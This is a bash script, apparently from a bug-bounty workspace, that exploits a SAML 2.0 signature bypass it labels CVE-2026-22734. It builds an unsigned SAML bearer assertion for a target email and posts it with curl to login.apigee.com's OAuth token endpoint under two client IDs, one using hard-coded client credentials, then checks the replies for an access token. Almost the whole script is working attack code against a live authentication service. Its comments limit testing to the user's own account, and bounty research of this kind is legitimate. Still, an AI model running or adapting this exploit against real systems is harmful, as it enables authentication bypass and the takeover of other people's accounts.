#!/bin/bash
# CVE-2026-22734: UAA SAML 2.0 Signature Bypass
# ONLY RUN IF apigee_uaa_check.sh confirmed version in v77.21.0-v78.8.0
# Attempts to obtain an OAuth token for a target user with unsigned SAML assertion
# Run on Pi.
export PATH="/usr/bin:/usr/local/bin:/usr/sbin:/bin:$PATH"

OUTDIR="$HOME/bug-bounty-hunting-/results/apigee/03-candidates"
mkdir -p "$OUTDIR"
OUT="$OUTDIR/APG-L002-saml-bypass.txt"

# Target: own test account email (to verify we can get a token for a known user)
# NEVER target accounts you don't own. Use your own registered email.
TARGET_EMAIL="${1:-zahinshahriar3@gmail.com}"
RECIPIENT="https://login.apigee.com/oauth/token"
NOW=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
FUTURE=$(date -u -d "+1 hour" +"%Y-%m-%dT%H:%M:%SZ" 2>/dev/null || date -u -v+1H +"%Y-%m-%dT%H:%M:%SZ")

echo "=== CVE-2026-22734: UAA SAML Bearer Bypass Test ===" | tee "$OUT"
echo "Date: $(date -u)" | tee -a "$OUT"
echo "Target: $TARGET_EMAIL" | tee -a "$OUT"
echo | tee -a "$OUT"

# Build minimal unsigned SAML 2.0 bearer assertion
SAML_XML=$(cat <<SAML
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
  Version="2.0" ID="apigee_test_$(date +%s)" IssueInstant="${NOW}">
  <saml:Issuer>https://test.apigee.invalid/saml</saml:Issuer>
  <saml:Subject>
    <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">${TARGET_EMAIL}</saml:NameID>
    <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <saml:SubjectConfirmationData
        Recipient="${RECIPIENT}"
        NotOnOrAfter="${FUTURE}"/>
    </saml:SubjectConfirmation>
  </saml:Subject>
  <saml:Conditions NotBefore="${NOW}" NotOnOrAfter="${FUTURE}">
    <saml:AudienceRestriction>
      <saml:Audience>${RECIPIENT}</saml:Audience>
    </saml:AudienceRestriction>
  </saml:Conditions>
  <saml:AuthnStatement AuthnInstant="${NOW}">
    <saml:AuthnContext>
      <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
    </saml:AuthnContext>
  </saml:AuthnStatement>
</saml:Assertion>
SAML
)

SAML_B64=$(echo -n "$SAML_XML" | base64 -w 0)
echo "SAML assertion (truncated): ${SAML_B64:0:80}..." | tee -a "$OUT"
echo | tee -a "$OUT"

# Test 1: unifiedui client (management console client we know exists)
echo "=== Test 1: client_id=unifiedui with unsigned SAML assertion ===" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 15 \
  -X POST "https://login.apigee.com/oauth/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Accept: application/json" \
  -D /tmp/saml_test1_headers.txt \
  -o /tmp/saml_test1_body.txt \
  -d "grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Asaml2-bearer&assertion=${SAML_B64}&client_id=unifiedui"
echo "--- Headers ---" | tee -a "$OUT"
/usr/bin/cat /tmp/saml_test1_headers.txt | tee -a "$OUT"
echo "--- Body ---" | tee -a "$OUT"
/usr/bin/cat /tmp/saml_test1_body.txt | tee -a "$OUT"
echo | tee -a "$OUT"

# Test 2: edgecli client (management API client)
echo "=== Test 2: client_id=edgecli with unsigned SAML assertion ===" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 15 \
  -X POST "https://login.apigee.com/oauth/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Accept: application/json" \
  -u "edgecli:edgeclisecret" \
  -D /tmp/saml_test2_headers.txt \
  -o /tmp/saml_test2_body.txt \
  -d "grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Asaml2-bearer&assertion=${SAML_B64}"
echo "--- Headers ---" | tee -a "$OUT"
/usr/bin/cat /tmp/saml_test2_headers.txt | tee -a "$OUT"
echo "--- Body ---" | tee -a "$OUT"
/usr/bin/cat /tmp/saml_test2_body.txt | tee -a "$OUT"
echo | tee -a "$OUT"

# Interpret results
echo "=== INTERPRETATION ===" | tee -a "$OUT"

RESULT1=$(python3 -c "
import json, sys
try:
    d = json.load(open('/tmp/saml_test1_body.txt'))
    if 'access_token' in d:
        print('*** CRITICAL: access_token received for unifiedui! CVE-2026-22734 CONFIRMED ***')
        print('Token:', d['access_token'][:40], '...')
    elif 'error' in d:
        print('Error:', d.get('error'), '-', d.get('error_description',''))
    else:
        print('Unexpected:', str(d)[:200])
except: print('Non-JSON response')
" 2>/dev/null)
echo "Test 1 (unifiedui): $RESULT1" | tee -a "$OUT"

RESULT2=$(python3 -c "
import json, sys
try:
    d = json.load(open('/tmp/saml_test2_body.txt'))
    if 'access_token' in d:
        print('*** CRITICAL: access_token received for edgecli! CVE-2026-22734 CONFIRMED ***')
        print('Token:', d['access_token'][:40], '...')
    elif 'error' in d:
        print('Error:', d.get('error'), '-', d.get('error_description',''))
    else:
        print('Unexpected:', str(d)[:200])
except: print('Non-JSON response')
" 2>/dev/null)
echo "Test 2 (edgecli):   $RESULT2" | tee -a "$OUT"

echo | tee -a "$OUT"
echo "Key: if error='unauthorized_client' → SAML bearer NOT enabled for this client (try others)"
echo "Key: if error='invalid_assertion' → SAML bearer IS enabled but assertion rejected (try signed version)"
echo "Key: if access_token received → CVE-2026-22734 CONFIRMED. REPORT IMMEDIATELY."
echo
echo "Done. Results: $OUT"
